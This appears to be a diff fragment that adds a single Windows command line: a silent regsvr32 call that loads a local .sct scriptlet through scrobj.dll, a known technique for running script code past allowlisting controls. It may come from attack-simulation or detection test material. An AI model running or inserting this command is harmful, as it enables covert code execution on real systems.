@@ -1,0 +1,1 @@
+C:\Windows\system32\regsvr32.exe /s /u /i:"4774cd_RegSvr32.sct" scrobj.dll
